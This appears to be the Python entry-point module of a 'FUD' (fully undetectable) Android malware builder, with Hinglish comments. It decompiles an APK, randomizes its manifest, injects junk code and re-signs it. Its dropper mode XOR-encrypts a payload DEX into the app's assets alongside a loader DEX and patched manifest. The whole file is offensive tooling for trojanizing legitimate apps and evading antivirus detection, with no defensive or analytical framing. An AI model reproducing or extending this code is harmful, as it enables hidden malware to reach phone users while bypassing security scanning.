"""
FUD pipeline — public API.

  full_fud_pipeline(input_apk, output_apk, session_dir)
  full_fud_pipeline_dropper(input_apk, payload_dex, output_apk, session_dir)

First call pe ensure_tools() automatically sab kuch install karta hai.
"""
import os

from setup import ensure_tools
from apktool_wrapper import decompile, recompile
from manifest import randomize_manifest
from junk_injector import inject_junk
from signer import sign_apk
from payload_injector import (
    _patch_manifest, _read_app_class,
    _build_fud_app_dex, _add_to_apk,
)
from tools_encrypt import encrypt_bytes


__all__ = [
    "full_fud_pipeline",
    "full_fud_pipeline_dropper",
    "ensure_tools",
]


def full_fud_pipeline(input_apk: str, output_apk: str, session_dir: str) -> str:
    """Sirf obfuscation + repackage + sign. Koi payload embed nahi."""
    ensure_tools()
    os.makedirs(session_dir, exist_ok=True)

    decompiled = os.path.join(session_dir, "decompiled")
    decompile(input_apk, decompiled)
    randomize_manifest(decompiled)
    inject_junk(decompiled)

    unsigned = os.path.join(session_dir, "unsigned.apk")
    recompile(decompiled, unsigned)

    sign_apk(unsigned, output_apk)
    return output_apk


def full_fud_pipeline_dropper(input_apk: str, payload_dex: str,
                              output_apk: str, session_dir: str) -> str:
    """Dropper mode — payload assets/p.bin me XOR-encrypted embed."""
    ensure_tools()
    os.makedirs(session_dir, exist_ok=True)

    with open(payload_dex, "rb") as f:
        raw = f.read()
    pbin = os.path.join(session_dir, "p.bin")
    with open(pbin, "wb") as f:
        f.write(encrypt_bytes(raw))

    decompiled = os.path.join(session_dir, "decompiled")
    decompile(input_apk, decompiled)
    randomize_manifest(decompiled)
    inject_junk(decompiled)

    original_class = _read_app_class(decompiled)
    fud_dex = os.path.join(session_dir, "fudapp.dex")
    _build_fud_app_dex(original_class, fud_dex)
    _patch_manifest(decompiled)

    unsigned = os.path.join(session_dir, "unsigned.apk")
    recompile(decompiled, unsigned)

    _add_to_apk(unsigned, pbin, fud_dex)

    sign_apk(unsigned, output_apk)
    return output_apk
